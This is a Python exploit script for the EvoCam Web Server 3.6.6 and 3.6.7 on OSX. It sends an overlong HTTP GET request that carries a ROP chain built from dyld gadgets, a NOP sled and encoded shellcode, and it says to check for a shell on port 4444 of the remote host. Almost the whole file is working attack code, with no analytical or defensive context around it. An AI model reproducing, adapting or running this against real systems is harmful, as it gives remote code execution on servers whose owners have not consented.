#!/usr/bin/python 
# EvoCam Web Server OSX 3.6.6 and 3.6.7

import socket 
import struct

SHELL = ( "\xdb\xd2\x29\xc9\xb1\x27\xbf\xb1\xd5\xb6\xd3\xd9\x74\x24" 
"\xf4\x5a\x83\xea\xfc\x31\x7a\x14\x03\x7a\xa5\x37\x43\xe2" 
"\x05\x2e\xfc\x45\xd5\x11\xad\x17\x65\xf0\x80\x18\x8a\x71" 
"\x64\x19\x94\x75\x10\xdf\xc6\x27\x70\x88\xe6\xc5\x65\x14" 
"\x6f\x2a\xef\xb4\x3c\xfb\xa2\x04\xaa\xce\xc3\x17\x4d\x83" 
"\x95\x85\x21\x49\xd7\xaa\x33\xd0\xb5\xf8\xe5\xbe\x89\xe3" 
"\xc4\xbf\x98\x4f\x5f\x78\x6d\xab\xdc\x6c\x8f\x08\xb1\x25" 
"\xc3\x3e\x6f\x07\x63\x4c\xcc\x14\x9f\xb2\xa7\xeb\x51\x75" 
"\x17\x5c\xc2\x25\x27\x67\x2f\x45\xd7\x08\x93\x6b\xa2\x21" 
"\x5c\x31\x81\xb2\x1f\x4c\x19\xc7\x08\x80\xd9\x77\x5f\xcd" 
"\xf6\x04\xf7\x79\x27\x89\x6e\x14\xbe\xae\x21\xb8\x93\x60" 
"\x72\x03\xde\x01\x43\xb4\xb0\x88\x47\x64\x60\xd8\xd7\xd5" 
"\x30\xd9\x1a\x55\x01\x26\xf4\x06\x21\x6b\x75\xac" )

WRITEABLE = 0x8fe66448                      # Writable address - dyld
STRCPY=0x8fe2db10                           # strcpy() in dyld

# ==================== Put stack pointer into EAX/EDX ==================== 
ROP =   struct.pack('>I',0x8fe2b3d4)     # POP - RET Insturction - Pop's over the writeable value below
ROP +=  struct.pack('>I',WRITEABLE)      # Required Writeable address here for exploit to work
ROP +=  struct.pack('>I',0x8fe2fb63)     # pop eax # ret - needed for command two below
ROP +=  struct.pack('>I',WRITEABLE)      # writeable address to pop into eax for instructions below
ROP +=  struct.pack('>I',0x8fe2fb58)     # push esp # and al,0x4 # mov [eax+0x28],edx # mov edx,[esp] # mov [eax],edx # pop eax # ret 

# ==================== Jump Over Parameters below ==================== 
ROP +=  struct.pack('>I',0xffff1d6b)     # add esp,byte +0x1c # pop ebp # ret

# ==================== strcpy call ==================== 
ROP +=  struct.pack('>I',STRCPY)         # use strcpy to copy shellcode from stack to heap
ROP +=  struct.pack('>I',0x8fe2dfd1)     # POP - POP - RET over strcpy params
ROP +=  struct.pack('>I',WRITEABLE)      # Dst Param for strcpy
ROP +=  'EEEE'                              # Src Param for strcpy - Placeholder
ROP +=  struct.pack('>I',WRITEABLE)      # Move execution to where we moved our shell
ROP +=  'C'*12                              # Padding 

# ==================== Craft Parameter 2  ==================== 
# Need to inc EAX or EDX to point to shell code

# Store  0x10 in ECX
ROP +=  struct.pack('>I',0x8fe2dae4)     # mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret  
ROP +=  struct.pack('>I',0x8fe2b3d4)     # POP - RET Insturction - Pop's over the value below
ROP +=  struct.pack('>I',0xffffffff)     # Value to store in ecx
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret

# Replace stack pointer back into eax as it was trashed
ROP +=  struct.pack('>I',0x8fe2c71d)    # mov eax,edx # ret

# Add offset to paramter 
ROP +=  struct.pack('>I',0x8fe2def4)    # add eax,ecx # ret

# Swap over so we can work on fresh copy of saved ESP
ROP +=  struct.pack('>I',0x8fe0e32d)    # xchg eax,edx

# Increase ECX some more times to point to our nop sled/shell code
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret

# Add offset to shellcode 
ROP +=  struct.pack('>I',0x8fe2def4)     # add eax,ecx # ret

# Swap back
ROP +=  struct.pack('>I',0x8fe0e32d)     # xchg eax,edx

# Copy parameter to placeholder
ROP +=  struct.pack('>I',0x8fe2fb61)     # mov [eax],edx # pop eax # ret
ROP +=  'G'*4                               # junk to pop into eax

# ==================== Call strcpy function ==================== 

# Set our Stack pointer back to original value 
ROP +=  struct.pack('>I',0x8fe0e32d)     # xchg eax,edx
ROP +=  struct.pack('>I',0x8fe2daea)     # sub eax,ecx # ret

# Return execution to our strdup call above
ROP +=  struct.pack('>I',0x8fe0b1c2)     # xchg eax,ebp # inc ebp # ret 
ROP +=  struct.pack('>I',0x8fe2b6a5)     # dec ebp # ret
ROP +=  struct.pack('>I',0xffff01f3)     # mov esp,ebp # pop ebp # ret
ROP +=  'G'*4                            # junk

# ==================== Exploit code to be copied to heap ==================== 

NOP =   '\x90' * 10
BUFFER = 'A'*1564 + ROP + NOP + SHELL

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
connect=s.connect(('192.168.1.10',8080))
print '[+] Sending evil buffer...'
s.send("GET " +BUFFER + " HTTP/1.0\r\n\r\n")
print "[+] Done!"
print "[*] Check your shell on remote host port 4444"
s.close() 